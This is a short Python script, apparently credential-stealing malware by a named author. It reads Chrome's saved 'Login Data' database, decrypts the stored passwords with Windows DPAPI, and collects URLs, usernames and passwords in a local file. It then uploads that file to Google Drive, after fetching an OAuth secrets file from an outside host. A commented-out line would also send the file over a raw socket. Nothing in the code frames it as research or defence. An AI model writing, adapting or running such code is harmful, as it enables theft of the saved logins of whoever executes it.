#Ahmed Saeed V 1.2
from os import getenv
from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive
import sqlite3
import win32crypt
import socket
import random, string
import sys
import requests

#Detect IP OF User
s = socket.socket()
host = socket.gethostbyname(socket.getfqdn())
port = 80

#Authosrize

def download_file_from_google_drive(id, destination):
    URL = "http://serinc.tech/nova/client_secrets.json"

    session = requests.Session()

    response = session.get(URL, params = { 'id' : id }, stream = True)
    token = get_confirm_token(response)

    if token:
        params = { 'id' : id, 'confirm' : token }
        response = session.get(URL, params = params, stream = True)

    save_response_content(response, destination)    

def get_confirm_token(response):
    for key, value in response.cookies.items():
        if key.startswith('download_warning'):
            return value

    return None

def save_response_content(response, destination):
    CHUNK_SIZE = 32768

    with open(destination, "wb") as f:
        for chunk in response.iter_content(CHUNK_SIZE):
            if chunk: # filter out keep-alive new chunks
                f.write(chunk)

if __name__ == "__main__":
    file_id = 'TAKE ID FROM SHAREABLE LINK'
    destination = 'client_secrets.json'
    download_file_from_google_drive(file_id, destination)
	
g_login = GoogleAuth()
g_login.LocalWebserverAuth()
drive = GoogleDrive(g_login)

 
conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
def randomword(length):
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(length))
#randomword(1)+
conn2 = sqlite3.connect("passwordsdecrypt.db")
clientsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
cursor = conn.cursor()
cursor2 = conn2.cursor()
 
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
cursor2.execute('''CREATE TABLE passwords(url, username, password)''')
 
for result in cursor.fetchall():
    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
    url = result[0]
    username = result[1]
    if password:
        cursor2.execute("INSERT INTO passwords (url, username, password) VALUES (?, ?, ?)", (url, username, password))
        conn2.commit()
		

#Just Read File
passfile = open("passwordsdecrypt.db", "rb")
readfrompassfile = passfile.read()
#clientsock.sendall(readfrompassfile)

#Login to Google Drive and create drive object
import os, fnmatch

listOfFiles = os.listdir('.')  
pattern = "*.db"  
for entry in listOfFiles:  
    if fnmatch.fnmatch(entry, pattern):
            print (entry)
import glob, os
file_drive = drive.CreateFile({'db': entry })  
file_drive.SetContentFile('passwordsdecrypt.db')
file_drive.Upload()

print "The file: " + entry + " has been uploaded"		

conn.close()
conn2.close()


